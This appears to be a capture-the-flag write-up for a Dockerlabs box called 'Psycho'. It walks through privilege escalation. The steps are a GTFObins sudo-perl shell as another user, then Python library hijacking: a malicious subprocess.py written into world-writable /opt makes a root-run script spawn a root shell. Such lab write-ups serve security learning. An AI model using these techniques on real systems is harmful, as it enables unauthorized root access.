### Dockerlabs: Psycho

This box was a bit tricky at the start. I couldn't figure out at the start how to get RCE but once I found the LFI vulnerability it was quite straightforward. The privilege escalation part I have seen somewhere else (probably a machine from HTB) so it was a nice reminder. Overall a fun box.

### Before we start

Before we start it's good to take a look at the box or challenge's description. You might find something key to progress through the challenge. In this case the box's description mentioned the use of service enumeration, LFI exploitation, SSH key exfiltration and sudo privilege escalation.

It kind of spoils some of the techniques to be used to root the box but it's still nice to see in case I get stuck.

### Horizontal escalation

Since I got password for the `vaxei` user, I can verify the privileges (if any) our user has.

```bash
vaxei@a1ecaf130795:~$ sudo -ln
Matching Defaults entries for vaxei on a1ecaf130795:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on a1ecaf130795:
    (luisillo) NOPASSWD: /usr/bin/perl
vaxei@a1ecaf130795:~$ 
```

We can run **perl** as `luisillo`. After checking on [GTFObins](https://gtfobins.github.io/gtfobins/perl/), we can abuse this privilege and obtain a shell as `luisillo` following the next step:

```bash
vaxei@a1ecaf130795:~$ sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
$ whoami
luisillo
$ 
```

### Sudo again?

As the description initially suggested, this is about sudo exploitation. So I see once again what sudo privileges I have now as **luisillo**.

```bash
$ sudo -ln
Matching Defaults entries for luisillo on a1ecaf130795:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on a1ecaf130795:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py

```

I can execute the `/opt/paw.py` script as root. Let's check out this python script.

```python
import subprocess
import os
import sys
import time

# F
def dummy_function(data):
    result = ""
    for char in data:
        result += char.upper() if char.islower() else char.lower()
    return result

# Código para ejecutar el script
os.system("echo Ojo Aqui")

# Simulación de procesamiento de datos
def data_processing():
    data = "This is some dummy data that needs to be processed."
    processed_data = dummy_function(data)
    print(f"Processed data: {processed_data}")

# Simulación de un cálculo inútil
def perform_useless_calculation():
    result = 0
    for i in range(1000000):
        result += i
    print(f"Useless calculation result: {result}")

def run_command():
    subprocess.run(['echo Hello!'], check=True)

def main():
    # Llamadas a funciones que no afectan el resultado final
    data_processing()
    perform_useless_calculation()
    
    # Comando real que se ejecuta
    run_command()

if __name__ == "__main__":
    main()
```

Taking an extra look into the python script I can see its privileges.

```

I can't modify the `paw.py` script.

There seems to be a problem importing the **subprocess.py** library.

On a closer inspection on the `/opt/` folder:

```shell
drwxr-xrwx   1 root root 4096 Aug 10  2024 opt
```

I can see my any user has write privileges on `/opt/`. Meaning I can insert a malicious python library file and the script will try to import it because of the python hierarchy for libraries.


```bash
$ echo 'import os; os.system("/bin/bash")' > subprocess.py
$ sudo /usr/bin/python3 /opt/paw.py
root@a1ecaf130795:/opt# whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
root@a1ecaf130795:/opt#
```

I get root!
